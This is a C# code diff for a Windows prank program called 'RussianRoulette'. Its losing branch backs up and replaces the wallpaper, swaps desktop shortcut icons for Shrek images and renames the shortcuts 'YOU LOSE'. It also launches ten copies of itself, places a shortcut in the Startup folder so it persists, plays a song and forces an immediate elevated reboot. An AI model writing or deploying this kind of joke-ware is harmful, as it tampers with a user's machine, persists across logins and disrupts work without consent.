@@ -103,7 +103,7 @@ namespace RussianRoulette
             new Thread(() =>
             {
                 Thread.Sleep(10000);
-                using (var ms = new MemoryStream(Resources.allstar))
+                using (var ms = new MemoryStream(Resources.allstare))
                 using (var player = new System.Media.SoundPlayer(ms))
                 {
                     player.Play();
@@ -232,16 +232,14 @@ namespace RussianRoulette
             Directory.CreateDirectory(backupIcons);
 
             string wallpaperPath = Path.Combine(backupDir, "wallpaper.bmp");
-
-            if (File.Exists(wallpaperPath)) 
+            if (File.Exists(wallpaperPath))
             {
-                SetWallpaper(wallpaperPath); 
+                SetWallpaper(wallpaperPath);
             }
             else
             {
                 Console.WriteLine("⚠️ Wallpaper file not found.");
             }
-
 
             string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
             string[] shortcuts = Directory.GetFiles(desktopPath, "*.lnk");
@@ -251,7 +249,7 @@ namespace RussianRoulette
             {
                 string origLnk = shortcuts[i];
                 string fileName = $"shortcut{i}.lnk";
-                string iconPath = "путь к иконке"; // Здесь должно быть реальное значение для иконки
+                string iconPath = "путь к иконке"; 
 
                 File.Copy(origLnk, Path.Combine(backupIcons, fileName), true);
                 metadata.Add(new ShortcutMetadata
@@ -272,17 +270,12 @@ namespace RussianRoulette
 
             ConsoleColor[] colors = (ConsoleColor[])Enum.GetValues(typeof(ConsoleColor));
             Random rnd = new Random();
-
             for (int i = 0; i < 10; i++)
             {
                 Console.BackgroundColor = colors[rnd.Next(colors.Length)];
                 Console.Clear();
                 Thread.Sleep(100);
             }
-
-
-
-
 
             string folderPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "WallpaperBackup");
             Directory.CreateDirectory(folderPath);
@@ -295,23 +288,21 @@ namespace RussianRoulette
             {
                 img.Save(bmpImagePath, ImageFormat.Bmp);
             }
-
             SetWallpaper(bmpImagePath);
-
 
             string iconFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Icons");
             Directory.CreateDirectory(iconFolder);
 
             byte[][] iconResources = new byte[][]
             {
-                Resources.artShrek, Resources.Baybe, Resources.cat, Resources.Cat1, Resources.Cat2, Resources.Dragon, Resources.fairy,
-                Resources.Fiona, Resources.headShrek, Resources.Osel, Resources.OsloShrek, Resources.Pechen, Resources.princeCrarli,
-                Resources.shrek3, Resources.ShrekArtik, Resources.smallKing,
+        Resources.artShrek, Resources.abaybe, Resources.cat, Resources.Cat1, Resources.Cat2, Resources.Dragon, Resources.fairy,
+        Resources.Fiona, Resources.headShrek, Resources.Osel, Resources.OsloShrek, Resources.Pechen, Resources.princeCrarli,
+        Resources.shrek3, Resources.ShrekArtik, Resources.smallKing,
             };
 
             for (int i = 0; i < shortcuts.Length && i < iconResources.Length; i++)
             {
-                string shortcutPath1 = shortcuts[i];
+                string oldShortcut = shortcuts[i];
                 string newName = $"YOU LOSE ({i + 1}).lnk";
                 string newPath = Path.Combine(desktopPath, newName);
 
@@ -323,45 +314,53 @@ namespace RussianRoulette
                     icon.Save(fs);
                 }
 
-                var shell1 = new WshShell();
-                var lnk = (IWshShortcut)shell1.CreateShortcut(shortcutPath1);
-                lnk.IconLocation = iconPath;
+                var shell = new WshShell();
+                var lnk = (IWshShortcut)shell.CreateShortcut(oldShortcut);
+                lnk.IconLocation = iconPath + ",0";
                 lnk.Save();
 
-                using (var ms = new MemoryStream(Resources.allstar))
-                using (var player = new System.Media.SoundPlayer(ms))
-                {
-                    player.Play();
-                }
+                
 
-                System.IO.File.Move(shortcutPath1, newPath);
+                if (File.Exists(newPath)) File.Delete(newPath);
+                File.Move(oldShortcut, newPath);
             }
 
             string exePath = Process.GetCurrentProcess().MainModule.FileName;
             for (int i = 0; i < 10; i++)
             {
                 Process.Start(exePath, "child");
-
             }
 
             string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-            string shortcutPath2 = Path.Combine(startupFolder, "MyAppShortcut.lnk");
-
+            string shortcutPath = Path.Combine(startupFolder, "MyAppShortcut.lnk");
             var shell2 = new WshShell();
-            var shortcut = (IWshShortcut)shell2.CreateShortcut(shortcutPath2);
-            shortcut.TargetPath = exePath;
-            shortcut.WorkingDirectory = Path.GetDirectoryName(exePath);
-            shortcut.Save();
+            var startupShortcut = (IWshShortcut)shell2.CreateShortcut(shortcutPath);
+            startupShortcut.TargetPath = exePath;
+            startupShortcut.WorkingDirectory = Path.GetDirectoryName(exePath);
+            startupShortcut.Save();
 
-
-            Process.Start(new ProcessStartInfo("shutdown", "/r /t 0")
+            using (var ms = new MemoryStream(Resources.allstare))
+            using (var player = new System.Media.SoundPlayer(ms))
             {
-                CreateNoWindow = true,
-                UseShellExecute = false
-            });
-            
-        }
+                player.PlaySync(); 
+            }
 
+            try
+            {
+                Process.Start(new ProcessStartInfo("shutdown", "/r /t 0")
+                {
+                    UseShellExecute = true,
+                    Verb = "runas", 
+                    CreateNoWindow = true
+                });
+            }
+            catch (Exception ex)
+            {
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.WriteLine($"⚠ Не удалось перезагрузить систему: {ex.Message}");
+                Console.ResetColor();
+            }
+        }
 
 
 
@@ -369,10 +368,11 @@ namespace RussianRoulette
     }
     class ShortcutMetadata
     {
-        public string OriginalName { get; set; }
-        public string FileName { get; set; }
-        public string IconPath { get; set; }
+        public string? OriginalName { get; set; }
+        public string? FileName { get; set; }
+        public string? IconPath { get; set; }
     }
+
 
     class DesktopIcons
     {
